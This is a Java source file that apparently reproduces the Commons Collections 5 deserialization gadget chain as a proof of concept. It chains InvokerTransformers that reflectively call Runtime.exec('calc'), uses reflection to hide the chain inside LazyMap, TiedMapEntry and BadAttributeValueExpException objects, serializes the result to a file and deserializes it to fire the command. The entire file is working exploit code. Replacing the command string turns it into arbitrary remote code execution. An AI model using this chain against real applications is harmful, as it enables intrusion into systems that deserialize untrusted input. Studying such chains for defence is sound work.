package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.HashedMap;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashedMap map=new HashedMap();
        map.put("value","cc1");
        Map<Object,Object> lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"aaa");
        BadAttributeValueExpException o = new BadAttributeValueExpException("1");
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(o,tiedMapEntry);
        Field factoryField = LazyMap.class.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);


        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
        objectOutputStream.writeObject(o);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}
